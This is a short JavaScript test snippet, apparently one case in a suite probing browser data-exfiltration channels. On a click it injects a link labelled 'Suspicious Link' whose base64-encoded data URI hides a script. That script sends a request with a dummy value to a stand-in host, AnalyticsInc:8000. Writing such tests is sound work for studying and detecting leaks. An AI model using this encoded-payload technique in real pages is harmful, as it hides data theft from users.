function exfiltrate_key_history() {

    // Data URI 6 - Anchor Embed - Base64
    // Exfiltrate data using XMLHTTP request
	var data = 'PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNiIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=';
    var URL = 'data:text/html;charset=utf-8;base64,' + data;
    var script = document.createElement("a");
    script.href = URL;
	script.innerHTML = 'Suspicious Link';
    script.id = 'mylink';
	document.getElementsByTagName('body')[0].appendChild(script);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
